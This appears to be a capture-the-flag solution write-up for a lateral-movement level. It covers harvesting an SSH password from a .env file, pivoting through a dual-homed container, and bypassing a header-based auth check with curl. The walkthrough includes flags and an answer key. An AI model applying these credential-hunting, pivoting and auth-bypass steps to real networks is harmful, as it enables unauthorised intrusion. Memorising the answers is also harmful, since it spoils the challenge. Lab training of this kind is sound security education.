# L19 — lm-chain · All the Way In

**Act IV · Lateral Movement · T1210**
**Status:** Solved
**Flag:** `bl_c1cde2865befe17bfc94d3cbd9e0e9c8`

---

## Challenge brief

> Three hosts, one crown jewel, reachable only through the whole path. Pivot, reuse,
> exploit the service in the middle, and land on the host that holds the prize.

MITRE tag T1210 is "Exploitation of Remote Services" — using a vulnerability or
weakness in a network service on a remote host to gain access or extract data. In this
level, the "exploitation" is a trivially bypassable authentication check on boxC's
internal HTTP service.

Three hosts, three hops:
1. **Foothold (boxA)** — where you land. Has the credential.
2. **BoxB** — the pivot host. Dual-homed: connected to both boxA's network and boxC's
   network. Reachable via SSH with the harvested credential.
3. **BoxC** — the crown jewel host. Only reachable from boxB. Runs a web service on
   port 8080 with a weak authentication check.

---

## Foundation: what dual-homed means and why it matters

A **dual-homed** host is a machine connected to two separate networks simultaneously.
It has two network interfaces, each with an IP address on a different subnet. Because
it sits on both networks, it can communicate with hosts on either one.

This is what makes boxB the pivot point in this level. BoxA can only reach boxB (they
share network 1). BoxC is only reachable from boxB (they share network 2). BoxA cannot
reach boxC directly — there's no route between boxA's network and boxC's network.

```
Internet / Your machine
        │
        ▼
  [BoxA foothold]
  10.66.245.2/24          ← Network 1 (eth0)
        │
        ▼
  [BoxB pivot]
  10.66.245.3/24  (eth0)  ← Network 1 (same as boxA)
  10.66.221.2/24  (eth1)  ← Network 2 (new network, only boxB and boxC)
        │
        ▼
  [BoxC crown jewel]
  10.66.221.3/24          ← Network 2 (eth0)
```

BoxB is the bridge. It's the only host that can talk to both boxA and boxC. This is why
the challenge says "the host that holds the prize is reachable only through the whole
path" — you have to go through boxB to get to boxC.

In the real world, dual-homed hosts are common: a web server might be connected to both
the public internet and an internal database network. A bastion host might connect to
both a corporate office network and a production server network. Compromising a
dual-homed host gives you a foothold into every network it touches.

---

## Reading dual-interface `ip addr` output

When we ran `ip addr` on boxB, we saw something we hadn't seen before — two real
network interfaces:

```
1: lo: <LOOPBACK,UP,LOWER_UP> ...
    inet 127.0.0.1/8 scope host lo

2: eth0@if6054486: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> ...
    inet 10.66.245.3/24 brd 10.66.245.255 scope global eth0

3: eth1@if6054487: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> ...
    inet 10.66.221.2/24 brd 10.66.221.255 scope global eth1
```

**Interface 1 (`lo`)** — loopback. Always present, always `127.0.0.1`. Traffic here
stays on the same machine. Never a network to scan.

**Interface 2 (`eth0`)** — the first real network interface. `10.66.245.3/24`. This is
the connection back to boxA. We already know this network — it's the one the foothold
is on (`10.66.245.2`). The `.3` confirms boxB is the third host on that network.

**Interface 3 (`eth1`)** — a second real network interface. `10.66.221.2/24`. This is
a completely separate Docker bridge network that boxB is also connected to. The `.2`
means boxB is the second host on this network — the gateway (`.1`) was created first.

**What to do when you see a second interface:** This is the signal that you are on a
dual-homed host. The new subnet (`10.66.221.0/24`) is unreachable from anywhere except
boxB. Ping sweep it immediately — there will be at least one more host there.

**Why eth1 is the new network, not eth0:** Docker assigns interfaces in the order
networks are attached to the container. `eth0` is always the first network, `eth1` is
the second. For boxB, the first network (connecting to boxA) was `10.66.245.0/24`, and
the second (connecting to boxC) was `10.66.221.0/24`.

**The `@if<number>` suffix** — `eth0@if6054486` means this is a veth (virtual ethernet)
pair, and the other end is interface number 6054486 on the Docker host. This is a Docker
implementation detail that you can ignore during enumeration.

---

## Network topology discovery — the full picture

When you discover a dual-homed host, you need to map the new network before anything
else. The process is the same as the initial scan, just for the new subnet.

### Confirm the new network's hosts

```sh
for i in $(seq 1 254); do
  ping -c 1 -W 1 10.66.221.$i 2>/dev/null | grep -q "1 packets received" && echo "10.66.221.$i up"
done
```

Result on boxB:
```
10.66.221.1 up   ← Docker gateway (not a target)
10.66.221.2 up   ← boxB itself (us)
10.66.221.3 up   ← boxC (the crown jewel host)
```

### Why we can predict .3 will be there

Docker Compose assigns IPs sequentially to containers joining a network. The gateway
always gets `.1`. The first container to join gets `.2`, the second gets `.3`, and so
on. Since boxB is at `.2` on the new network, there's almost always a `.3` as well.
This prediction is reliable enough to scan `.3` first rather than waiting for the full
sweep.

---

## Port scanning without nmap

BoxB did not have nmap installed. The fallback is `/dev/tcp` in bash. We've seen this
before, but it's worth noting: this time we have bash (confirmed with `which bash`),
so `/dev/tcp` works reliably, unlike in busybox ash.

```sh
for port in 22 80 443 8080 3000 9000 9090 9200 5432 3306 6379; do
  timeout 1 bash -c "echo >/dev/tcp/10.66.221.3/$port" 2>/dev/null && echo "$port open"
done
```

This found nothing on the first sweep. Rather than running a full 65535-port scan
(which takes too long without nmap), the right next step was to read what was actually
on boxB — specifically `entry.sh`, which told us exactly what to look for.

**The lesson:** When a tool sweep fails, read the scripts and config files on the box.
CTF challenge designers often leave breadcrumbs in startup scripts, comments, or config
files that hint at what to try next.

---

## The entry.sh script — reading challenge designer hints

```sh
cat /usr/local/bin/entry.sh
```

```sh
#!/bin/sh
# Box B — the pivot host, dual-homed (net1 with box A, net2 with box C). Runs sshd with a
# svc account (password set per session by seed); once the player logs in as svc they can
# reach box C's internal service (curl is present) to exploit it. Generate host keys,
# start sshd, then exec "$@".
set -e
ssh-keygen -A 2>/dev/null
/usr/sbin/sshd
exec "$@"
```

This comment is the challenge designer telling you:
- BoxB is dual-homed (which we already knew from `ip addr`)
- The `svc` account is the entry point (already used)
- BoxC has an "internal service" reachable from boxB
- `curl` is available on boxB to reach that service
- The service is to be "exploited" (meaning it has a weak check to bypass)

The script itself does: generate SSH host keys (`ssh-keygen -A`), start sshd, then
execute whatever command was passed as the container's CMD. The "Generate host keys"
comment refers only to this SSH setup — it has nothing to do with the auth header.

---

## The filtered ports — what they meant

When we scanned boxB from the foothold, nmap reported several ports as `filtered`:

```
2228/tcp filtered
2231/tcp filtered
...
2241/tcp filtered
```

**What "filtered" means in nmap:** A filtered port means nmap sent a packet but got no
response — not a "connection refused" (RST) and not an open response. This usually means
a firewall is dropping the packets silently. It does NOT mean the port is open.

In this case, those ports were filtered because they don't actually exist on boxB — the
firewall on the Docker host was dropping the packets before they reached the container.
Nmap saw silence and reported "filtered." They were false leads.

**Rule of thumb:** Filtered ports from an external scan are worth investigating only
if you have a reason to believe a service is there. When you gain access to the box and
`ss -tlnp` shows nothing on those ports, they're genuinely closed/filtered with no
service.

---

## The crown service on boxC — HTTP auth bypass

Port 8080 on boxC runs a web service. When we curled the root path:

```sh
curl -s http://10.66.221.3:8080/
```

No response — the root path (`/`) returns nothing.

```sh
curl -s http://10.66.221.3:8080/crown
```

```
forbidden: internal callers only
```

The service has one interesting endpoint: `/crown`. It checks whether the caller is
"internal" using the `X-Internal-Auth` HTTP header. Any caller without this header is
rejected with "forbidden: internal callers only."

### What HTTP headers are

An HTTP request consists of a method, a path, and a set of headers. Headers are
key-value pairs that carry metadata about the request:

```
GET /crown HTTP/1.1
Host: 10.66.221.3:8080
X-Internal-Auth: 1
```

Standard headers include things like `Content-Type`, `Authorization`, `User-Agent`, and
`Accept`. The `X-` prefix traditionally indicated a custom, non-standard header (though
this convention is now deprecated). `X-Internal-Auth` is a custom header this service
invented to restrict access to "internal" callers.

**Why this is a vulnerability:** The service checks for the presence of
`X-Internal-Auth` and probably just checks that it has any truthy value. An attacker
who knows the header name can supply any value and bypass the check. This is security
through obscurity — the check only works if the attacker doesn't know the header name.

Since we were on boxB (an "internal" host on boxC's network), we were in a position to
make requests that would look like internal calls. But the check didn't verify our IP
address — it checked a header, which any HTTP client can set freely.

### Testing the bypass

```sh
curl -s http://10.66.221.3:8080/crown
# → "forbidden: internal callers only"

curl -s -H "X-Internal-Auth: true" http://10.66.221.3:8080/crown
# → "forbidden: internal callers only"

curl -s -H "X-Internal-Auth: internal" http://10.66.221.3:8080/crown
# → "forbidden: internal callers only"

curl -s -H "X-Internal-Auth: 1" http://10.66.221.3:8080/crown
# → 6ed5ed54309621918ab8ee71a8b9a9c1
```

`1` worked while `true` and `internal` did not. This tells us the service checks for
a specific value, not just any truthy value. The value `1` is a common convention in
simple internal auth checks — it's the simplest possible "yes" value. In a real CTF
or pentest, you'd try common values (`1`, `yes`, `ok`, `allow`, `secret`) when you
know a header is checked.

### The curl -H flag explained

```sh
curl -s -H "X-Internal-Auth: 1" http://10.66.221.3:8080/crown
```

- `-s` — silent mode. Suppresses progress bars and error messages, leaving only the
  response body.
- `-H "X-Internal-Auth: 1"` — add a custom HTTP header. The format is `"Name: Value"`.
  You can add multiple `-H` flags for multiple headers.
- `http://10.66.221.3:8080/crown` — the URL to request. `8080` is the port, `/crown`
  is the path.

---

## The proof value lives on boxC, not on the foothold

An important distinction in this level: the crown secret is returned by boxC's service
(`6ed5ed54309621918ab8ee71a8b9a9c1`). The proof file must be written on the foothold
(`/tmp/.lm-chain-proof`). The flow:

1. SSH into boxB from foothold (SSH session 1)
2. Curl boxC from boxB to get the secret (while in SSH session 1)
3. `exit` back to foothold
4. Write the secret to the proof file on the foothold
5. Run `verify` on the foothold

The secret never touches the foothold's disk until step 4. We held it in memory (in the
terminal output) and copied it manually. In a real engagement you might pipe it directly:

```sh
# From the foothold, using SSH to run the curl on boxB
ssh -o StrictHostKeyChecking=no svc@10.66.245.3 \
  "curl -s -H 'X-Internal-Auth: 1' http://10.66.221.3:8080/crown"
```

This runs the curl command on boxB via SSH without opening an interactive shell, and the
output comes directly to the foothold's terminal. Cleaner for automation.

---

## Enumeration log

### Step 1 — Foothold network awareness

```sh
id && ip addr && ip route && cat /etc/hosts
```

Result: root on `10.66.245.2/24`, single subnet, no pre-planted hostnames.

**Decision:** Credential reuse level (same pattern as L18). Find the credential first.

---

### Step 2 — Find the credential on the foothold

```sh
find / -not -path '/proc/*' -not -path '/sys/*' -not -path '/usr/lib/*' -not -path '/etc/ssl/*' -newer /etc/hostname -type f 2>/dev/null
cat /root/.local/share/deploy/.env
```

Result: `DEPLOY_USER=svc`, `DEPLOY_PASS=fc360a7611763b33`.

**Decision:** SSH to boxB as `svc`.

---

### Step 3 — SSH to boxB and discover the dual-homed network

```sh
ssh -o StrictHostKeyChecking=no svc@10.66.245.3
ip addr
```

**Key finding:** `eth1` with `10.66.221.2/24` — boxB is dual-homed. A second network
exists that is invisible from the foothold.

**What the two interfaces mean:** BoxB sits on both `10.66.245.0/24` (shared with
foothold) and `10.66.221.0/24` (a new network where boxC lives). The foothold cannot
reach `10.66.221.0/24` at all — only boxB can bridge the two.

**Decision:** Scan the new network for boxC.

---

### Step 4 — Discover boxC

```sh
for i in $(seq 1 254); do ping -c 1 -W 1 10.66.221.$i 2>/dev/null | grep -q "1 packets received" && echo "10.66.221.$i up"; done
```

Result: `.1` (gateway), `.2` (boxB itself), `.3` (boxC).

Port scan with `/dev/tcp` on common ports found nothing. Nmap not available on boxB.

**Decision:** Read the entry script on boxB for hints.

---

### Step 5 — Read entry.sh for direction

```sh
cat /usr/local/bin/entry.sh
```

Comment confirms: boxC has an "internal service", curl is available, the service is to
be exploited. We know to try curl on common web ports.

```sh
curl -s --connect-timeout 2 http://10.66.221.3:8080/
# no response from /
curl -s --connect-timeout 2 http://10.66.221.3:8080/crown
# → "forbidden: internal callers only"
```

Port 8080 has a service. The `/crown` endpoint is restricted by the `X-Internal-Auth`
header.

**Decision:** Try common bypass values for the header.

---

### Step 6 — Bypass the auth check

```sh
curl -s -H "X-Internal-Auth: 1" http://10.66.221.3:8080/crown
```

Result: `6ed5ed54309621918ab8ee71a8b9a9c1`

The header value `1` bypassed the check. The crown secret is obtained.

---

### Step 7 — Write proof on foothold and verify

```sh
exit    # back to foothold
printf '6ed5ed54309621918ab8ee71a8b9a9c1' > /tmp/.lm-chain-proof && verify
```

**Level solved.**

---

## What the challenge demonstrates

This level teaches the full lateral movement chain in a segmented network:

1. **Credential harvesting** — the `.env` file on the foothold contains the password
   for `svc` on boxB. Same pattern as L18.

2. **Pivot through a dual-homed host** — boxB connects two isolated networks. Without
   it, boxC is completely invisible. The SSH session on boxB is the tunnel through which
   all subsequent access flows.

3. **Service exploitation** — boxC's `/crown` endpoint uses a custom HTTP header for
   access control. The header name is `X-Internal-Auth` and the value `1` bypasses the
   check. This models real-world "security through obscurity" — the check only protects
   against callers who don't know the header name. Any caller who discovers the header
   can bypass it trivially.

**What would actually protect the service:**
- IP-based access control — only allow requests from specific source IPs (e.g., only
  from boxB's IP `10.66.221.2`)
- A proper secret token that is not guessable (e.g., a 32-character random string
  stored securely, not just `1`)
- mTLS — mutual TLS authentication, where both client and server present certificates
  to prove their identity

---

## Dead ends

### Filtered ports on boxB (from foothold scan)

Nmap reported ports 2228-2241 as filtered. These looked suspicious but turned out to be
packets dropped by the Docker networking layer before reaching boxB. `ss -tlnp` on boxB
confirmed nothing was listening on those ports. Filtered ports from an external scan are
not reliable signals when confirmed absent from inside the host.

### Privilege escalation on boxB

We checked sudo, SUID binaries, and users. No escalation path. Escalation was not needed
— `svc` had network access to boxC already, and the curl command could be run as `svc`.

### Port sweep of boxC with /dev/tcp

The common ports sweep found nothing. Rather than running a 65535-port sweep (which
would take many minutes), reading `entry.sh` revealed the service existed and curl was
the right tool. `curl` probing of ports 80, 8080, 3000, 9000 found it quickly.

### Wrong auth header values

`true`, `internal`, and no header all failed with "forbidden." The value `1` succeeded.
When guessing auth bypass values, start with the simplest truthy values: `1`, `yes`,
`true`, `ok`, `allow`.

---

## Carryover findings

None. The level is self-contained.

---

## Command reference

| Command | What it does |
|---|---|
| `ip addr` | Show all network interfaces — multiple `ethN` entries mean dual-homed host |
| `ip route` | Show routing table — reveals additional networks reachable from this host |
| `for i in $(seq 1 254); do ping -c 1 -W 1 10.x.x.$i 2>/dev/null \| grep -q "1 packets received" && echo "$i up"; done` | Ping sweep to find live hosts on a new subnet |
| `which bash` | Check if bash (not ash) is available — needed for reliable /dev/tcp |
| `for port in 22 80 443 8080 ...; do timeout 1 bash -c "echo >/dev/tcp/<ip>/$port" 2>/dev/null && echo "$port open"; done` | Port check with bash /dev/tcp — works where nmap is absent |
| `cat /usr/local/bin/entry.sh` | Read the container startup script — often contains hints |
| `curl -s http://<ip>:<port>/` | Try HTTP on a discovered port |
| `curl -s http://<ip>:<port>/crown` | Try specific API endpoints |
| `curl -s -H "X-Internal-Auth: 1" http://<ip>:<port>/crown` | Add a custom HTTP header to bypass auth check |
| `ssh -o StrictHostKeyChecking=no user@<ip> "curl -s -H 'X-Internal-Auth: 1' http://<boxC>:<port>/crown"` | Run curl on a remote host via SSH without opening interactive shell |
| `ss -tlnp` | List listening TCP ports — confirms which ports actually have services |
| `printf 'VALUE' > /tmp/.lm-chain-proof && verify` | Write proof and verify |